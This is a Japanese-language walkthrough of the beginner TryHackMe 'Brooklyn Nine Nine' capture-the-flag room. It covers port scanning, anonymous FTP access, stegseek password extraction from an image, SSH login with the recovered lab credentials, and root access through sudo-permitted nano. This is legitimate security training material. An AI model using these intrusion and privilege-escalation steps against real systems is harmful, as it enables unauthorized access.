# Brooklyn Nine Nine CTF

https://tryhackme.com/room/brooklynninenine

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.219.37
root@ip-10-10-200-39:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-02-26 05:15 GMT
Nmap scan report for 10.10.219.37
Host is up (0.00016s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:76:D3:6B:1D:AF (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 2.64 seconds
root@ip-10-10-200-39:~# sudo nmap -sV -p21,22,80 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-02-26 05:16 GMT
Nmap scan report for 10.10.219.37
Host is up (0.00016s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
MAC Address: 02:76:D3:6B:1D:AF (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

### gobuster

```shell
root@ip-10-10-200-39:~# gobuster dir -x=txt,php -u http://$TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.219.37
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/server-status        (Status: 403) [Size: 277]
Progress: 654825 / 654828 (100.00%)
===============================================================
Finished
===============================================================
```

何もなし

### FTP

```shell
$ ftp 10.10.219.37
Connected to 10.10.219.37.
220 (vsFTPd 3.0.3)
Name (10.10.219.37:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -al
229 Entering Extended Passive Mode (|||33785|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        114          4096 May 17  2020 .
drwxr-xr-x    2 0        114          4096 May 17  2020 ..
-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
```

```shell
$ cat ./note_to_jake.txt
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
```

Jake のパスワードは脆弱。

### ホームページ

```html
<!-- Have you ever heard of steganography? -->
```

画像に何か隠されていることを示唆している。

```shell
$ stegseek ./brooklyn99.jpg /usr/share/wordlists/rockyou.txt
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "admin"
[i] Original filename: "note.txt".
[i] Extracting to "brooklyn99.jpg.out".

$ cat ./brooklyn99.jpg.out
Holts Password:
fluffydog12@ninenine

Enjoy!!
```

holt / fluffydog12@ninenine で SSH ログインできた。

```shell
holt@brookly_nine_nine:~$ cat user.txt
ee11...........
```

## 権限昇格

```shell
holt@brookly_nine_nine:~$ sudo -l
Matching Defaults entries for holt on brookly_nine_nine:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User holt may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /bin/nano
```

nano に sudo がついている。

```shell
$ sudo nano /root/root.txt
```

```text
-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: 63a9f..............

Enjoy!!
```

## 振り返り

- 超初心者向け
